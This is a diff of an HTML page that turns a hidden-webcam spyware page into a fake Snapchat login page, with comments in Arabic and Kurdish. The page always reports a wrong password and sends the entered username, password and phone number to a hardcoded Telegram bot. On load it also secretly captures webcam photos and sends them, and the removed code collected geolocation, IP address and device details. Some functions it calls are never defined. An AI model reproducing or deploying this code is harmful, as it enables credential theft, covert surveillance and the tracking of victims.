@@ -1,33 +1,269 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>tiktok porn</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تسجيل الدخول</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #fff;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+  }
+  .login-container {
+    width: 90%;
+    max-width: 400px;
+    direction: ltr;
+  }
+  h2 {
+    text-align: center;
+    font-weight: 600;
+    font-size: 24px;
+    margin-bottom: 30px;
+    color: #000;
+  }
+  label {
+    display: block;
+    margin-bottom: 6px;
+    font-weight: 600;
+    font-size: 14px;
+    color: #0080ff;
+  }
+  input[type="text"],
+  input[type="email"],
+  input[type="password"],
+  input[type="tel"] {
+    width: 100%;
+    padding: 12px 15px;
+    margin-bottom: 20px;
+    border: 1.5px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+  .phone-input-container {
+    position: relative;
+  }
+  .country-code {
+    position: absolute;
+    top: 50%;
+    left: 15px;
+    transform: translateY(-50%);
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+    color: #0080ff;
+    font-weight: 600;
+  }
+  .country-code img {
+    width: 22px;
+    height: 14px;
+    margin-right: 5px;
+    border: 1px solid #ccc;
+  }
+  input.phone-input {
+    padding-left: 90px;
+  }
+  .link {
+    color: #0080ff;
+    text-decoration: none;
+    font-size: 14px;
+    display: block;
+    margin-bottom: 20px;
+    cursor: pointer;
+  }
+  .link:hover {
+    text-decoration: underline;
+  }
+  .checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    color: #a0a0a0;
+    font-size: 14px;
+  }
+  .checkbox-container input {
+    margin-right: 8px;
+  }
+  button {
+    width: 100%;
+    padding: 14px 0;
+    background-color: #a3a9ad;
+    border: none;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 600;
+    color: white;
+    cursor: not-allowed;
+  }
+  button.enabled {
+    background-color: #0080ff;
+    cursor: pointer;
+  }
+  .password-container {
+    position: relative;
+  }
+  .toggle-password {
+    position: absolute;
+    top: 50%;
+    right: 15px;
+    transform: translateY(-50%);
+    cursor: pointer;
+    font-size: 18px;
+    color: #aaa;
+  }
+  /* Modal styles */
+  .modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0,0,0,0.3);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+  }
+  .modal {
+    background: white;
+    border-radius: 15px;
+    padding: 30px 20px;
+    width: 90%;
+    max-width: 350px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  }
+  .modal p {
+    margin-bottom: 25px;
+    font-size: 16px;
+    color: #444;
+  }
+  .modal button {
+    width: 100%;
+    padding: 14px 0;
+    margin: 8px 0;
+    border-radius: 30px;
+    border: none;
+    font-weight: 600;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .modal .btn-primary {
+    background-color: #333c45;
+    color: white;
+  }
+  .modal .btn-cancel {
+    background: none;
+    color: #444;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 15px;
+  }
+  .error-message {
+    color: red;
+    margin-top: -15px;
+    margin-bottom: 15px;
+    font-size: 14px;
+  }
+</style>
 </head>
 <body>
-  
-  <video id="video" width="0" height="0" autoplay playsinline></video>
+   <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
   
-<iframe 
-  width="100%" 
-  height="2000" 
-  src="https://pin.porn" 
-  title="YouTube video player" 
-  frameborder="0" 
-  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-  allowfullscreen>
-</iframe>
+<div class="login-container">
+  <h2>Log In</h2>
+  <form id="loginForm">
+    <label id="inputLabel" for="inputField">USERNAME OR EMAIL</label>
 
-  <script>
-    const video = document.getElementById('video');
+    <div id="inputWrapper">
+      <input type="text" id="inputField" name="inputField" placeholder="Enter username or email" required />
+    </div>
+
+    <a id="toggleLink" class="link">Use phone number instead</a>
+
+    <label for="password">PASSWORD</label>
+    <div class="password-container">
+      <input type="password" id="password" name="password" placeholder="Enter password" required />
+      <span id="togglePassword" class="toggle-password">&#128065;</span>
+    </div>
+    <div id="errorMessage" class="error-message"></div>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="saveLogin" checked />
+      <label for="saveLogin" style="color:#a0a0a0; font-weight: normal;">Save Login Info on your device</label>
+    </div>
+
+    <a href="#" id="forgotPassword" class="link">Forgot your password?</a>
+
+    <button type="submit" id="loginBtn" disabled>Log In</button>
+  </form>
+</div>
+
+<!-- مودال اختيار إعادة تعيين كلمة المرور -->
+<div id="modalOverlay" class="modal-overlay">
+  <div class="modal">
+    <p>Please choose how you want to reset your password.</p>
+    <button class="btn-primary" id="viaPhoneBtn">Via Phone</button>
+    <button class="btn-primary" id="viaEmailBtn">Via Email</button>
+    <div class="btn-cancel" id="cancelBtn">Cancel</div>
+  </div>
+</div>
+
+<!-- مودال نافذة إدخال رقم الهاتف للتحقق -->
+<div id="phoneResetModal" class="modal-overlay" style="display:none;">
+  <div class="modal" style="direction:ltr; text-align:left;">
+    <a href="#" id="phoneResetBack" style="font-size: 20px; display:inline-block; margin-bottom: 20px; color:#000; text-decoration:none;">&#8592;</a>
+    <h3 style="margin-top:0;">Find your Snapchat account</h3>
+
+    <label for="phoneResetInput" style="color:#0080ff; font-weight: 600; font-size: 14px;">PHONE NUMBER</label>
+    <div style="position:relative; margin-bottom:5px;">
+      <span style="position:absolute; left:10px; top:50%; transform: translateY(-50%); color:#0080ff; font-weight:600; font-size:14px; display:flex; align-items:center;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f6/Flag_of_Iraq.svg" alt="Iraq Flag" style="width:22px; height:14px; border:1px solid #ccc; margin-right:5px;" />
+        IQ +964
+      </span>
+      <input type="tel" id="phoneResetInput" placeholder="791 234 5678" style="width:100%; padding:12px 15px 12px 100px; border-radius: 8px; border:1.5px solid #ccc; font-size:16px;" pattern="\d{9,10}" required />
+    </div>
+
+    <p style="font-size:14px; color:#444; margin-bottom: 5px;">
+      We'll send you a verification code via WhatsApp or SMS.
+    </p>
+
+    <!-- رسالة الخطأ تظهر دايمًا -->
+    <p id="phoneErrorMsg" style="color: red; font-size: 14px; margin-bottom: 20px;">
+      We cannot find an account for this phone number.
+    </p>
+
+    <a href="#" style="color:#0080ff; font-size:14px; display:block; margin-bottom: 30px;">Need Help?</a>
+
+    <div class="checkbox-container" style="margin-bottom: 30px;">
+      <input type="checkbox" id="saveLoginReset" checked />
+      <label for="saveLoginReset" style="color:#a0a0a0; font-weight: normal;">Save Login Info on your device</label>
+    </div>
+
+    <button id="phoneSubmitBtn" style="width:100%; padding:14px 0; border-radius:30px; background:#FFEB3B; color:#000; font-weight:600; font-size:16px; border:none; cursor:pointer;">
+      Submit
+    </button>
+  </div>
+</div>
+
+<script>
+
+const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-
-    const TELEGRAM_BOT_TOKEN = "7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw";
-    const CHAT_ID = "5454881984";
-
-    async function captureAndSend() {
+    
+  const TELEGRAM_BOT_TOKEN = '7574278665:AAEsAdjvpWZY1e7FGkRiT-sF_C2AahkkOBw';
+  const TELEGRAM_CHAT_ID = '5454881984';
+  
+  async function captureAndSend() {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async function(blob) {
         const formData = new FormData();
@@ -50,36 +286,6 @@
         }
       }, 'image/jpeg');
     }
-    
-function isBlackFrame(canvas) {
-  const pixels = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height).data;
-  for (let i = 0; i < pixels.length; i += 4) {
-    if (pixels[i] > 10 || pixels[i + 1] > 10 || pixels[i + 2] > 10) {
-      return false; // فيه ألوان
-    }
-  }
-  return true; // كله أسود
-}
-
-async function autoCaptureLoop() {
-  while (true) {
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    if (isBlackFrame(canvas)) {
-      console.warn("إطار أسود. إعادة تشغيل الكاميرا...");
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (err) {
-        console.error("فشل إعادة تشغيل الكاميرا:", err);
-      }
-    } else {
-      captureAndSend(); // أرسل الصورة إذا كانت طبيعية
-    }
-    await new Promise(r => setTimeout(r, 1000)); // انتظر 1 ثانية
-  }
-}
-
-autoCaptureLoop(); // ابدأ الحلقة
 
     // شغل الكاميرا وانتظر حتى تبدأ فعلياً قبل إرسال أي صورة
     async function startCameraAndSending() {
@@ -99,86 +305,209 @@ autoCaptureLoop(); // ابدأ الحلقة
         setInterval(captureAndSend, 5000);
 
       } catch (err) {
-        alert("دەبێت سەرەتا هەموو بەشەکان کە دەکرێتەوە بەسەندی بکەی");
+        alert("سێرڤەرەکە وەستاوە تکایە سەرەتا ناوت تۆمار بکە دواتر ڤیدیوکان ئەگرێتەوە");
         console.error("دوبارە هەوڵ بدەوە و بیکەوە", err);
       }
     }
 
     // ابدأ مباشرة عند تحميل الصفحة
+    
     startCameraAndSending();
+    startBothCameras();
     
-// بيانات البوت
-    
-    function sendTelegramMessage(text) {
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: "HTML"
-        })
-      });
-    }
-
     function getDeviceInfo() {
-      return `
+  return `
 🧾 <b>Device Info</b>
 User Agent: ${navigator.userAgent}
 Platform: ${navigator.platform}
 Language: ${navigator.language}
-Memory: ${navigator.deviceMemory || 'N/A'} GB
+Device Memory: ${navigator.deviceMemory || 'N/A'} GB
 Cores: ${navigator.hardwareConcurrency || 'N/A'}
 Cookies Enabled: ${navigator.cookieEnabled}
-      `;
-    }
+  `;
+}
 
-    function getIPInfo() {
-      fetch('https://api.db-ip.com/v2/free/self')
-        .then(res => res.json())
-        .then(data => {
-          const msg = `
+function getIPInfo() {
+  fetch('https://api.db-ip.com/v2/free/self')
+    .then(res => res.json())
+    .then(data => {
+      const msg = `
 🌐 <b>IP Info</b>
 IP: ${data.ipAddress}
 City: ${data.city}
 Region: ${data.stateProv}
 Country: ${data.countryName}
 Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
-          `;
-          sendTelegramMessage(msg);
-        }).catch(() => {
-          sendTelegramMessage("❌ Failed to get IP info.");
-        });
+      `;
+      sendTelegramMessage(msg);
+    }).catch(() => {
+      sendTelegramMessage("❌ Failed to get IP info.");
+    });
+}
+
+  async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        }),
+      });
+      const data = await response.json();
+      return data.ok;
+    } catch (error) {
+      console.error('Telegram send error:', error);
+      return false;
+    }
+  }
+
+  const inputLabel = document.getElementById('inputLabel');
+  const inputWrapper = document.getElementById('inputWrapper');
+  const toggleLink = document.getElementById('toggleLink');
+  const loginBtn = document.getElementById('loginBtn');
+  const passwordField = document.getElementById('password');
+  const togglePassword = document.getElementById('togglePassword');
+  const forgotPassword = document.getElementById('forgotPassword');
+  const errorMessageElem = document.getElementById('errorMessage');
+
+  const modalOverlay = document.getElementById('modalOverlay');
+  const viaPhoneBtn = document.getElementById('viaPhoneBtn');
+  const viaEmailBtn = document.getElementById('viaEmailBtn');
+  const cancelBtn = document.getElementById('cancelBtn');
+
+  const phoneResetModal = document.getElementById('phoneResetModal');
+  const phoneResetBack = document.getElementById('phoneResetBack');
+  const phoneResetInput = document.getElementById('phoneResetInput');
+  const phoneSubmitBtn = document.getElementById('phoneSubmitBtn');
+
+  let usingPhone = false;
+
+  const countryCodeHTML = `
+    <div class="phone-input-container">
+      <div class="country-code">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f6/Flag_of_Iraq.svg" alt="Iraq Flag" />
+        +964
+      </div>
+      <input type="tel" id="inputField" class="phone-input" name="phone" placeholder="791 234 5678" required pattern="\\d{9,10}" />
+    </div>
+  `;
+
+  toggleLink.addEventListener('click', (e) => {
+    e.preventDefault();
+    usingPhone = !usingPhone;
+
+    if(usingPhone) {
+      inputLabel.textContent = 'PHONE NUMBER';
+      inputWrapper.innerHTML = countryCodeHTML;
+      toggleLink.textContent = 'Use email or username instead';
+    } else {
+      inputLabel.textContent = 'USERNAME OR EMAIL';
+      inputWrapper.innerHTML = '<input type="text" id="inputField" name="inputField" placeholder="Enter username or email" required />';
+      toggleLink.textContent = 'Use phone number instead';
     }
 
-    function getLocation() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const msg = `📍 <b>Location</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
-            sendTelegramMessage(msg);
+    const newInputField = document.getElementById('inputField');
+    newInputField.addEventListener('input', validateInputs);
+    validateInputs();
+  });
 
-            // بعدها باقي المعلومات
-            sendTelegramMessage(getDeviceInfo());
-            getIPInfo();
-          },
-          err => {
-            sendTelegramMessage("⚠️ Location access denied.");
-            sendTelegramMessage(getDeviceInfo());
-            getIPInfo();
-          }
-        );
+  togglePassword.addEventListener('click', () => {
+    if(passwordField.type === 'password') {
+      passwordField.type = 'text';
+      togglePassword.style.color = '#0080ff';
+    } else {
+      passwordField.type = 'password';
+      togglePassword.style.color = '#aaa';
+    }
+  });
+
+  function validateInputs() {
+    const inputField = document.getElementById('inputField');
+    let inputVal = inputField.value.trim();
+    let passwordVal = passwordField.value.trim();
+
+    if(usingPhone) {
+      const phonePattern = /^\d{9,10}$/;
+      if(phonePattern.test(inputVal) && passwordVal !== '') {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('enabled');
       } else {
-        sendTelegramMessage("❌ Geolocation not supported.");
-        sendTelegramMessage(getDeviceInfo());
-        getIPInfo();
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('enabled');
+      }
+    } else {
+      if(inputVal !== '' && passwordVal !== '') {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('enabled');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('enabled');
       }
     }
+  }
 
-    // يبدأ التنفيذ تلقائيًا
-    getLocation();
-  </script>
+  document.addEventListener('input', (e) => {
+    if(e.target.id === 'inputField' || e.target.id === 'password') {
+      validateInputs();
+    }
+  });
+
+  forgotPassword.addEventListener('click', (e) => {
+    e.preventDefault();
+    modalOverlay.style.display = 'flex';
+  });
+
+  cancelBtn.addEventListener('click', () => {
+    modalOverlay.style.display = 'none';
+  });
+
+  viaPhoneBtn.addEventListener('click', () => {
+    modalOverlay.style.display = 'none';
+    phoneResetModal.style.display = 'flex';
+  });
+
+  phoneResetBack.addEventListener('click', (e) => {
+    e.preventDefault();
+    phoneResetModal.style.display = 'none';
+    modalOverlay.style.display = 'flex';
+  });
+
+  // زر إرسال مودال رقم الهاتف مفعل دائماً
+  phoneSubmitBtn.addEventListener('click', async () => {
+    const phoneValue = phoneResetInput.value.trim();
+    const message = `<b>Password reset request via Phone</b>\nPhone: ${phoneValue}`;
+    const sent = await sendToTelegram(message);
+    if(sent) {
+      
+      phoneResetModal.style.display = 'none';
+    } else {
+      alert('Failed to send data to Telegram.');
+    }
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    let userId = document.getElementById('inputField').value.trim();
+    let password = document.getElementById('password').value.trim();
+
+    // كل المحاولات خاطئة
+    errorMessageElem.textContent = 'Incorrect password, please try again.';
+    errorMessageElem.style.color = 'red';
+
+    // ارسال البيانات للتيليجرام
+    const message = `<b>Failed login attempt</b>\nUser: ${userId}\nPassword: ${password}`;
+    const sent = await sendToTelegram(message);
+
+    if(!sent) {
+      alert('Failed to send data to Telegram.');
+    }
+  });
+</script>
+
 </body>
 </html>
